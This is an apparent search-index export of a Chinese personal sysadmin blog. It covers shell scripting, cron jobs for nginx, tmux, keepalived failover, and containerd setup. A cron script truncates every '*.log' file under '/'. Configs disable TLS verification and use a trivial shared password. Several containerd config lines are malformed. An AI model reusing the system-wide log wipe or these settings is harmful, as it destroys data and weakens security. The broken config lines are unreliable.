","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:3:4","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#循环-seq-打印-printf"},{"categories":["blog"],"content":" 查找字符串 expr string=\"runoob is a great site\" echo `expr index \"$string\" io` # 输出4.因为o在第4个,i在第8位 ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:3:5","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#查找字符串-expr"},{"categories":["blog"],"content":" 代码示例","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#代码示例"},{"categories":["blog"],"content":" 内存检测重启 nginx */10 * * * * /opt/memory-check.sh \u003e\u003e/tmp/memory_check.log 2\u003e\u00261 #!/bin/bash echo `date +'%Y-%m-%d %H:%M:%S'` memory_usage=`free | awk '/Mem/{printf(\"%.2f\"), $3/$2 * 100}'` echo \"内存使用率为$memory_usage\" if (( $( echo \"$memory_usage \u003e 80\" | bc -l ) )); then /usr/local/nginx/sbin/nginx -t; if (( $? == 0 )); then echo \"配置检查没问题,开始reload nginx\" /usr/local/nginx/sbin/nginx -s reload; if (( $? == 0 )); then echo \"reload完成\" else echo \"reload失败\" fi fi fi echo \"=====================================\" ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#内存检测重启-nginx"},{"categories":["blog"],"content":" 清空 log 结尾的日志文件 0 3 * * * /opt/rm-log.sh #!/bin/bash files=`find / -name '*.log'` for file in $files do truncate -s 0 $file done ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:4:2","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#清空-log-结尾的日志文件"},{"categories":["blog"],"content":" 同步 nginx 配置 先要对远程主机进行 免密 ssh chmod +x sync_nginx.sh 移动到 mv sync_nginx.sh /usr/local/bin/sync_nginx.sh #!/bin/bash # 本地验证配置是否ok /usr/local/bin/nginx -t # 验证没问题，就reload if [ $? -eq 0 ]; then # 返回值为0，表示执行成功 echo \"本地验证成功\" # 执行xxx操作 /usr/local/bin/nginx -s reload echo \"nginx reload完成\" else echo \"本地验证失败，停止运行\" exit 1; fi # 远程主机验证 host_list=(\"stage-prod-nginx2\") for host in \"${host_list[@]}\" do echo \"$host 开始同步配置文件...\" # 同步下面3个路径 /usr/bin/rsync -atvP /usr/local/nginx/conf/nginx.conf \"root@$host:/usr/local/nginx/conf/nginx.conf\" /usr/bin/rsync -atvP /usr/local/nginx/conf/hosts/*.conf \"root@$host:/usr/local/nginx/conf/hosts/\" /usr/bin/rsync -atvP /usr/local/nginx/conf/options/*.conf \"root@$host:/usr/local/nginx/conf/options/\" /usr/bin/rsync -atvP /data/files/* \"root@$host:/data/files/\" # 远程测试nginx配置 /usr/bin/ssh \"root@$host\" \"/usr/local/bin/nginx -t\" # 远程机器测试成功，进行reload if [ $? -eq 0 ]; then # 返回值为0，表示执行成功 echo \"$host 验证成功\" # 执行xxx操作 /usr/bin/ssh \"root@$host\" \"/usr/local/bin/nginx -s reload\" echo \"$host nginx reload完成\" else echo \"$host 验证失败，停止运行\" exit 1; fi done ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:4:3","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#同步-nginx-配置"},{"categories":["journal"],"content":"2023-08-08 日记","date":"2023-08-08","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-08/","series":null,"tags":["journal"],"title":"2023-08-08","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-08/"},{"categories":["journal"],"content":"#lines 以前 2016 年在殷华的时候, 做农合系统学到了 oracle. 例如同步农合的数据到下一年的 sql. ","date":"2023-08-08","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-08/:0:0","series":null,"tags":["journal"],"title":"2023-08-08","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-08/#"},{"categories":["point"],"content":"tmux 是一种终端工具. 帮助你保存会话, 分屏. 要点: 免费 分屏 #todo/笔记 配合 trzsz 使用 ","date":"2023-08-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/tmux/:0:0","series":null,"tags":["point","tmux"],"title":"tmux","uri":"/posts/%E7%AC%94%E8%AE%B0/point/tmux/#"},{"categories":["point"],"content":" 配置 vim /etc/tmux.conf # 鼠标右键可分屏,拖动窗口大小 set -g mouse on # 默认关闭窗口需要按y确认,这一行去掉确认 bind-key \u0026 kill-window ","date":"2023-08-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/tmux/:1:0","series":null,"tags":["point","tmux"],"title":"tmux","uri":"/posts/%E7%AC%94%E8%AE%B0/point/tmux/#配置"},{"categories":["point"],"content":" 使用 # 安装 apt install tmux -y # 查看会话 tmux ls # 新建会话 tmux new -s 别名 # 更换别名 tmux rename-session -t 0或者别名xx xx2 # 杀死会话 tmux kill-session -t 0或者别名xx # 进入会话 tmux a [-t 0或者别名xx] # 下面的开头都是Ctrl+b # 更换当前会话别名 Ctrl+b $ # 窗口,一个会话可以多个窗口 # 新建一个窗口 Ctrl+b c # 窗口列表选择/切换会话 Ctrl+b w # 切换窗口 Ctrl+b n/p # 关闭当前窗口 Ctrl+b \u0026 # 左右分屏 Ctrl+b % # 上下分屏 Ctrl+b \" # 退出但是保持会话 Ctrl+b d ","date":"2023-08-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/tmux/:2:0","series":null,"tags":["point","tmux"],"title":"tmux","uri":"/posts/%E7%AC%94%E8%AE%B0/point/tmux/#使用"},{"categories":["point"],"content":"keepalived 是 linux 下的高可用解决方案. 通过共享 ip, 心跳检测的功能实现网络的高可用. 要点: 虚拟 ip 自动在节点间流转 配置比较简单 比较轻量 ","date":"2023-08-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/:0:0","series":null,"tags":["point","keepalived"],"title":"keepalived","uri":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/#"},{"categories":["point"],"content":" 安装","date":"2023-08-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/:1:0","series":null,"tags":["point","keepalived"],"title":"keepalived","uri":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/#安装"},{"categories":["point"],"content":" 主节点配置 apt install keepalived -y # 配置文件 vim /etc/keepalived/keepalived.conf global_defs { router_id ha1 # ha集群内唯一 enable_script_security # 允许执行脚本 script_user root # 指定执行脚本的用户 } vrrp_script check_health { script \"/usr/bin/systemctl is-active nginx\" # 检测nginx状态 interval 2 # 间隔时间 weight -100 # 失败后降低权重,成功的话会恢复 } vrrp_instance VI_1 { state MASTER # 主节点 interface enp0s3 #你的网卡名字 virtual_router_id 51 # ha集群内必须一致 priority 100 # 权重,可以为90 advert_int 1 # 主备通讯时间间隔 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { # 没被使用的ip dev 网卡名字 标签 标签名字 192.168.31.244 dev enp0s3 label enp0s3:1 } track_script { check_health } } # 启动 systemctl enable keepalived --now ","date":"2023-08-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/:1:1","series":null,"tags":["point","keepalived"],"title":"keepalived","uri":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/#主节点配置"},{"categories":["point"],"content":" 备份节点配置 vim /etc/keepalived/keepalived.conf global_defs { router_id ha2 # ha集群内唯一 enable_script_security # 允许执行脚本 script_user root # 指定执行脚本的用户 } vrrp_script check_health { script \"/usr/bin/systemctl is-active nginx\" # 检测nginx状态 interval 2 # 间隔时间 weight -100 # 失败后降低权重,成功的话会恢复 } vrrp_instance VI_1 { state BACKUP # 当前节点为高可用从角色,BACKUP为从节点 interface enp0s3 #你的网卡名字 virtual_router_id 51 # ha集群内必须一致 priority 90 # 权重,可以为90 advert_int 1 # 主备通讯时间间隔 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { # 没被使用的ip dev 网卡名字 标签 标签名字 192.168.31.244 dev enp0s3 label enp0s3:1 } track_script { check_health } } ","date":"2023-08-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/:1:2","series":null,"tags":["point","keepalived"],"title":"keepalived","uri":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/#备份节点配置"},{"categories":["point"],"content":" 验证在 node1 查询会发现 192.168.31.244/32 scope global enp0s3:1 root@node1:/etc/keepalived# ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: enp0s3: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:7d:18:8a brd ff:ff:ff:ff:ff:ff inet 192.168.31.210/24 metric 100 brd 192.168.31.255 scope global dynamic enp0s3 valid_lft 42367sec preferred_lft 42367sec inet 192.168.31.244/32 scope global enp0s3:1 valid_lft forever preferred_lft forever inet6 fe80::a00:27ff:fe7d:188a/64 scope link valid_lft forever preferred_lft forever 关闭 node1 的 keepalived 服务 systemctl stop keepalived. node2 同样会出现 192.168.31.244/32 scope global enp0s3:1. 在第三方机器上先 ping 一下 3 个主机拿到 mac 地址, 然后使用 arp -a 命令查询. # 一旦我们关闭node1的keepalived服务,192.168.31.244将会指向node2的mac地址 arp -a node1 192.168.31.210 08-00-27-4d-3b-7e 动态 node2 192.168.31.211 08-00-27-7d-18-8a 动态 vip 192.168.31.244 08-00-27-4d-3b-7e 动态 ","date":"2023-08-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/:1:3","series":null,"tags":["point","keepalived"],"title":"keepalived","uri":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/#验证"},{"categories":["point"],"content":" 阿里云配置参考 阿里云支持HaVip 和 如何使用HaVip和keepalived搭建主备双机实现业务高可用 不支持广播和组播. 需要配置单播通信. 配置如下: global_defs { router_id node1 # ha集群内唯一 enable_script_security # 允许执行脚本 script_user root # 指定执行脚本的用户 } vrrp_script check_health { script \"/usr/bin/systemctl is-active nginx\" # 检测nginx状态 interval 2 # 间隔时间 weight -100 # 失败后降低权重,成功的话会恢复 } vrrp_instance VI_1 { state MASTER # 主节点 interface eth0 # 你的网卡名字 virtual_router_id 51 # 必须一致 priority 100 # 权重,可以为90 advert_int 1 # 主备通讯时间间隔 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { # 没被使用的ip dev 网卡名字 标签 标签名字 192.168.31.244 dev eth0 label eth0:1 } unicast_src_ip 192.168.31.210 # 设置本机ECS实例的私网IP地址 unicast_peer { 192.168.31.211 # 对端ECS实例的私网IP地址 } track_interface { eth0 # 设置ECS实例网卡名 } track_script { check_health } } ","date":"2023-08-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/:2:0","series":null,"tags":["point","keepalived"],"title":"keepalived","uri":"/posts/%E7%AC%94%E8%AE%B0/point/keepalived/#阿里云配置"},{"categories":["point"],"content":"Containerd 是一个 daemon 进程用来管理和运行容器. 它通过调用 runc 来创建和运行容器. 要点: docker 从 1.11 版本开始使用 Containerd 和 runc, 所以和 k8s 等生态是完全兼容的. 免费开源 ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/containerd/:0:0","series":null,"tags":["point","Containerd"],"title":"Containerd","uri":"/posts/%E7%AC%94%E8%AE%B0/point/containerd/#"},{"categories":["blog"],"content":"[[笔记/point/Containerd|Containerd]] 的操作配置.","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介这里记录 Containerd 的操作配置, 相关的概念可以通过 容器 来了解. ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#内容"},{"categories":["blog"],"content":" 安装到 官方仓库release 下载二进制包, 并解压. containerd: 包含 containerd 和 ctr. 配合 tar Cxzvf /usr/local containerd-1.6.2-linux-amd64.tar.gz 使用, 解压到 /usr/local 内. cri-containerd: 上面的 + runc 配合 cri-containerd-cni: 上面的 + cni 的 host-device,macvlan等等 containerd-static 应该是静态库链接用的. # containerd使用 # 解压到/usr/local tar Cxzvf /usr/local containerd-1.6.2-linux-amd64.tar.gz # cri-containerd-cni # 解压到/ tar Cxzvf / cri-containerd-1.6.2-linux-amd64.tar.gz Systemd 守护配置路径 /etc/systemd/system/containerd.service [Unit] Description=containerd container runtime Documentation=https://containerd.io After=network.target local-fs.target [Service] ExecStartPre=-/sbin/modprobe overlay ExecStart=/usr/local/bin/containerd Type=notify Delegate=yes KillMode=process Restart=always RestartSec=5 LimitNPROC=infinity LimitCORE=infinity LimitNOFILE=infinity TasksMax=infinity OOMScoreAdjust=-999 [Install] WantedBy=multi-user.target 加载配置, 开机启动 systemctl daemon-reload systemctl enable containerd --now ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 镜像源和代理 代理修改启动时的环境变量 /etc/systemd/system/containerd.service [Service] Environment=\"HTTPS_PROXY= http://9.21.61.141:3128/\" Environment=\"HTTP_PROXY= http://9.21.61.141:3128/\" Environment=\"NO_PROXY=localhost, 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com\" 镜像源不生效 (暂时 20230803)和 docker 镜像源不同的地方: 只有 CRI 才会生效. 也就是说 crictl 和 k8s 可以使用, ctr 无法使用. docker 只能配置 Docker Hub, 而 Containerd 可以配置任意仓库. 开始操作 先检查 /etc/containerd/config.toml 里面有没有需要用到的配置, 记录一下. 开始生成默认配置, 考虑加入第一步中的有用配置. containerd config default \u003e /etc/containerd/config.toml 编辑配置文件 /etc/containerd/config.toml,可以参照 [plugins.\"io.containerd.grpc.v1.cri\".registry] config_path = \"/etc/containerd/certs.d\" # 登录校验是暂时这么配,后面可能会改.参考https://github.com/containerd/containerd/blob/main/docs/cri/registry.md#configure-registry-credentials # The registry host has to be a domain name or IP. Port number is also # needed if the default HTTPS or HTTP port is not used. [plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"gcr.io\".auth] username = \"\" password = \"\" auth = \"\" identitytoken = \"\" 创建对应文件和目录. 下面为 docker.io 配置镜像 # 所有容器默认源 mkdir -p /etc/containerd/certs.d/_default vim /etc/containerd/certs.d/_default/hosts.toml server = \"https://hub-mirror.c.163.com\" [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # 官方源 mkdir -p /etc/containerd/certs.d/docker.io vim /etc/containerd/certs.d/docker.io/hosts.toml server = \"https://docker.io\"] [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # gcr mkdir -p /etc/containerd/certs.d/k8s.gcr.io vim /etc/containerd/certs.d/k8s.gcr.io/hosts.toml server = \"https://k8s.gcr.io\"] [host.\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] capabilities = [\"pull\", \"resolve\"] # 自有源 mkdir -p /etc/containerd/certs.d/192.168.12.34:5000 vim /etc/containerd/certs.d/192.168.12.34:5000/hosts.toml server = \"https://192.168.12.34:5000\" [host.\"192.168.12.34:5000\"] capabilities = [\"pull\", \"resolve\"] ca = \"/path/to/ca.crt\" skip_verify = true [!info] 相关延展 registry.mirrors 和 registry.configs 已经被弃用 参见 registry.md , config.md, hosts.md 镜像源生效上面的配置不生效, 需要追踪 这个issue……, 记录一下现在生效的配置 #todo/笔记 k8s.gcr.io 重定向到了 registry.k8s.io,是不是也需要代理, 记录一下 注释掉 config_path, 会开始读取 mirrors 配置 [plugins.\"io.containerd.grpc.v1.cri\".registry] # config_path = \"/etc/containerd/certs.d\" [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors] [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"docker.io\"] endpoint = [\"https://1ocw3lst.mirror.aliyuncs.com [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"k8s.gcr.io\"] # http.StatusNotFound # endpoint = [\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] endpoint = [\"k8s.dockerproxy.com\"] ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#镜像源和代理"},{"categories":["blog"],"content":" 镜像源和代理 代理修改启动时的环境变量 /etc/systemd/system/containerd.service [Service] Environment=\"HTTPS_PROXY= http://9.21.61.141:3128/\" Environment=\"HTTP_PROXY= http://9.21.61.141:3128/\" Environment=\"NO_PROXY=localhost, 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com\" 镜像源不生效 (暂时 20230803)和 docker 镜像源不同的地方: 只有 CRI 才会生效. 也就是说 crictl 和 k8s 可以使用, ctr 无法使用. docker 只能配置 Docker Hub, 而 Containerd 可以配置任意仓库. 开始操作 先检查 /etc/containerd/config.toml 里面有没有需要用到的配置, 记录一下. 开始生成默认配置, 考虑加入第一步中的有用配置. containerd config default \u003e /etc/containerd/config.toml 编辑配置文件 /etc/containerd/config.toml,可以参照 [plugins.\"io.containerd.grpc.v1.cri\".registry] config_path = \"/etc/containerd/certs.d\" # 登录校验是暂时这么配,后面可能会改.参考https://github.com/containerd/containerd/blob/main/docs/cri/registry.md#configure-registry-credentials # The registry host has to be a domain name or IP. Port number is also # needed if the default HTTPS or HTTP port is not used. [plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"gcr.io\".auth] username = \"\" password = \"\" auth = \"\" identitytoken = \"\" 创建对应文件和目录. 下面为 docker.io 配置镜像 # 所有容器默认源 mkdir -p /etc/containerd/certs.d/_default vim /etc/containerd/certs.d/_default/hosts.toml server = \"https://hub-mirror.c.163.com\" [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # 官方源 mkdir -p /etc/containerd/certs.d/docker.io vim /etc/containerd/certs.d/docker.io/hosts.toml server = \"https://docker.io\"] [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # gcr mkdir -p /etc/containerd/certs.d/k8s.gcr.io vim /etc/containerd/certs.d/k8s.gcr.io/hosts.toml server = \"https://k8s.gcr.io\"] [host.\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] capabilities = [\"pull\", \"resolve\"] # 自有源 mkdir -p /etc/containerd/certs.d/192.168.12.34:5000 vim /etc/containerd/certs.d/192.168.12.34:5000/hosts.toml server = \"https://192.168.12.34:5000\" [host.\"192.168.12.34:5000\"] capabilities = [\"pull\", \"resolve\"] ca = \"/path/to/ca.crt\" skip_verify = true [!info] 相关延展 registry.mirrors 和 registry.configs 已经被弃用 参见 registry.md , config.md, hosts.md 镜像源生效上面的配置不生效, 需要追踪 这个issue……, 记录一下现在生效的配置 #todo/笔记 k8s.gcr.io 重定向到了 registry.k8s.io,是不是也需要代理, 记录一下 注释掉 config_path, 会开始读取 mirrors 配置 [plugins.\"io.containerd.grpc.v1.cri\".registry] # config_path = \"/etc/containerd/certs.d\" [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors] [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"docker.io\"] endpoint = [\"https://1ocw3lst.mirror.aliyuncs.com [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"k8s.gcr.io\"] # http.StatusNotFound # endpoint = [\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] endpoint = [\"k8s.dockerproxy.com\"] ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#代理"},{"categories":["blog"],"content":" 镜像源和代理 代理修改启动时的环境变量 /etc/systemd/system/containerd.service [Service] Environment=\"HTTPS_PROXY= http://9.21.61.141:3128/\" Environment=\"HTTP_PROXY= http://9.21.61.141:3128/\" Environment=\"NO_PROXY=localhost, 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com\" 镜像源不生效 (暂时 20230803)和 docker 镜像源不同的地方: 只有 CRI 才会生效. 也就是说 crictl 和 k8s 可以使用, ctr 无法使用. docker 只能配置 Docker Hub, 而 Containerd 可以配置任意仓库. 开始操作 先检查 /etc/containerd/config.toml 里面有没有需要用到的配置, 记录一下. 开始生成默认配置, 考虑加入第一步中的有用配置. containerd config default \u003e /etc/containerd/config.toml 编辑配置文件 /etc/containerd/config.toml,可以参照 [plugins.\"io.containerd.grpc.v1.cri\".registry] config_path = \"/etc/containerd/certs.d\" # 登录校验是暂时这么配,后面可能会改.参考https://github.com/containerd/containerd/blob/main/docs/cri/registry.md#configure-registry-credentials # The registry host has to be a domain name or IP. Port number is also # needed if the default HTTPS or HTTP port is not used. [plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"gcr.io\".auth] username = \"\" password = \"\" auth = \"\" identitytoken = \"\" 创建对应文件和目录. 下面为 docker.io 配置镜像 # 所有容器默认源 mkdir -p /etc/containerd/certs.d/_default vim /etc/containerd/certs.d/_default/hosts.toml server = \"https://hub-mirror.c.163.com\" [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # 官方源 mkdir -p /etc/containerd/certs.d/docker.io vim /etc/containerd/certs.d/docker.io/hosts.toml server = \"https://docker.io\"] [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # gcr mkdir -p /etc/containerd/certs.d/k8s.gcr.io vim /etc/containerd/certs.d/k8s.gcr.io/hosts.toml server = \"https://k8s.gcr.io\"] [host.\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] capabilities = [\"pull\", \"resolve\"] # 自有源 mkdir -p /etc/containerd/certs.d/192.168.12.34:5000 vim /etc/containerd/certs.d/192.168.12.34:5000/hosts.toml server = \"https://192.168.12.34:5000\" [host.\"192.168.12.34:5000\"] capabilities = [\"pull\", \"resolve\"] ca = \"/path/to/ca.crt\" skip_verify = true [!info] 相关延展 registry.mirrors 和 registry.configs 已经被弃用 参见 registry.md , config.md, hosts.md 镜像源生效上面的配置不生效, 需要追踪 这个issue……, 记录一下现在生效的配置 #todo/笔记 k8s.gcr.io 重定向到了 registry.k8s.io,是不是也需要代理, 记录一下 注释掉 config_path, 会开始读取 mirrors 配置 [plugins.\"io.containerd.grpc.v1.cri\".registry] # config_path = \"/etc/containerd/certs.d\" [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors] [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"docker.io\"] endpoint = [\"https://1ocw3lst.mirror.aliyuncs.com [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"k8s.gcr.io\"] # http.StatusNotFound # endpoint = [\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] endpoint = [\"k8s.dockerproxy.com\"] ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#镜像源不生效-暂时-20230803"},{"categories":["blog"],"content":" 镜像源和代理 代理修改启动时的环境变量 /etc/systemd/system/containerd.service [Service] Environment=\"HTTPS_PROXY= http://9.21.61.141:3128/\" Environment=\"HTTP_PROXY= http://9.21.61.141:3128/\" Environment=\"NO_PROXY=localhost, 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com\" 镜像源不生效 (暂时 20230803)和 docker 镜像源不同的地方: 只有 CRI 才会生效. 也就是说 crictl 和 k8s 可以使用, ctr 无法使用. docker 只能配置 Docker Hub, 而 Containerd 可以配置任意仓库. 开始操作 先检查 /etc/containerd/config.toml 里面有没有需要用到的配置, 记录一下. 开始生成默认配置, 考虑加入第一步中的有用配置. containerd config default \u003e /etc/containerd/config.toml 编辑配置文件 /etc/containerd/config.toml,可以参照 [plugins.\"io.containerd.grpc.v1.cri\".registry] config_path = \"/etc/containerd/certs.d\" # 登录校验是暂时这么配,后面可能会改.参考https://github.com/containerd/containerd/blob/main/docs/cri/registry.md#configure-registry-credentials # The registry host has to be a domain name or IP. Port number is also # needed if the default HTTPS or HTTP port is not used. [plugins.\"io.containerd.grpc.v1.cri\".registry.configs.\"gcr.io\".auth] username = \"\" password = \"\" auth = \"\" identitytoken = \"\" 创建对应文件和目录. 下面为 docker.io 配置镜像 # 所有容器默认源 mkdir -p /etc/containerd/certs.d/_default vim /etc/containerd/certs.d/_default/hosts.toml server = \"https://hub-mirror.c.163.com\" [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # 官方源 mkdir -p /etc/containerd/certs.d/docker.io vim /etc/containerd/certs.d/docker.io/hosts.toml server = \"https://docker.io\"] [host.\"https://hub-mirror.c.163.com\"] capabilities = [\"pull\", \"resolve\"] # gcr mkdir -p /etc/containerd/certs.d/k8s.gcr.io vim /etc/containerd/certs.d/k8s.gcr.io/hosts.toml server = \"https://k8s.gcr.io\"] [host.\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] capabilities = [\"pull\", \"resolve\"] # 自有源 mkdir -p /etc/containerd/certs.d/192.168.12.34:5000 vim /etc/containerd/certs.d/192.168.12.34:5000/hosts.toml server = \"https://192.168.12.34:5000\" [host.\"192.168.12.34:5000\"] capabilities = [\"pull\", \"resolve\"] ca = \"/path/to/ca.crt\" skip_verify = true [!info] 相关延展 registry.mirrors 和 registry.configs 已经被弃用 参见 registry.md , config.md, hosts.md 镜像源生效上面的配置不生效, 需要追踪 这个issue……, 记录一下现在生效的配置 #todo/笔记 k8s.gcr.io 重定向到了 registry.k8s.io,是不是也需要代理, 记录一下 注释掉 config_path, 会开始读取 mirrors 配置 [plugins.\"io.containerd.grpc.v1.cri\".registry] # config_path = \"/etc/containerd/certs.d\" [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors] [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"docker.io\"] endpoint = [\"https://1ocw3lst.mirror.aliyuncs.com [plugins.\"io.containerd.grpc.v1.cri\".registry.mirrors.\"k8s.gcr.io\"] # http.StatusNotFound # endpoint = [\"https://registry.cn-hangzhou.aliyuncs.com/google_containers\"] endpoint = [\"k8s.dockerproxy.com\"] ","date":"2023-08-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","containerd"],"title":"Containerd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/containerd%E6%95%99%E7%A8%8B/#镜像源生效"},{"categories":["blog"],"content":" ctr 操作 命名空间 namespace 默认是 default 命名空间 , ctr image ls -n default Containerd 默认命名空间 default docker 默认命名空间 moby. 如果找不到容器, 修改 docker 的启动命令后重启再试. /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock =\u003e /usr/bin/dockerd --containerd /run/containerd/containerd.sock k8s 默认命名空间 k8s.io # 列出所有命名空间 ctr ns ls # 创建 ctr ns create test # 删除 ctr ns rm test 镜像 image # i,image,images都可以 # 镜像查看 ctr i ls # 镜像拉取,带上docker.io ctr i pull docker.io/kentxxq/test-server:latest # 镜像tag ctr i tag docker.io/kentxxq/test-server:latest xx/oo:latest # 删除镜像 ctr i rm # 导出镜像 ctr i export kentxxq.tar.gz docker.io/kentxxq/test-server:latest # 导入镜像 ctr i import kentxxq.tar.gz # 把容器的内容挂载到主机的/xxoo下面 ctr image mount docker.io/library/nginx:alpine /xxoo # 卸载目录 ctr image unmount /xxoo 运行 run # 前台运行 ctr run --rm docker.io/kentxxq/test-server:latest tt # 